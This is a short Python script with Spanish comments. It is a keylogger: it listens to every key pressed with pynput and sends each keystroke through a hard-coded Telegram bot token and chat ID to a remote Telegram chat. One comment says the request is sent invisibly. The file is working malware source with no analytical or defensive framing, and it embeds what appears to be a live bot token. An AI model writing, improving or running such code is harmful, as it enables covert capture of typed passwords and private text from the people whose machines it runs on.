import requests
from pynput import keyboard as kb

TOKEN_BOT = "8858568142:AAEL1qj5T9kD4We4_TP3fxLfVy3D1qLcBck"
CHAT_ID = -1003757438740

def enviar_mensaje_telegram(token, chat_id, mensaje):
    """Envía un mensaje de texto automático a un chat de Telegram."""
    # La URL corregida con 'api.' y '/bot'
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    
    # Tus datos empaquetados correctamente
    payload = {
        "chat_id": chat_id,
        "text": mensaje,
        "parse_mode": "Markdown"  
    }
    
    try:
        # Realiza la petición POST de forma invisible
        response = requests.post(url, json=payload)
        
        # Comprueba si Telegram devolvió un error (como token inválido o chat no iniciado)
        response.raise_for_status()
        
        print("¡Mensaje enviado con éxito!")
        return True
        
    except requests.exceptions.HTTPError as http_err:
        print(f"Error de Telegram: {response.text}")
        return False
    except requests.exceptions.RequestException as e:
        print(f"Error de conexión a la red: {e}")
        return False

def detect_k(key):
    TEXTO_MENSAJE = f"[+] Tecla pulsada -> {str(key)}\n"
    enviar_mensaje_telegram(TOKEN_BOT, CHAT_ID, TEXTO_MENSAJE)

if __name__ == "__main__":
    kb.Listener(detect_k).run()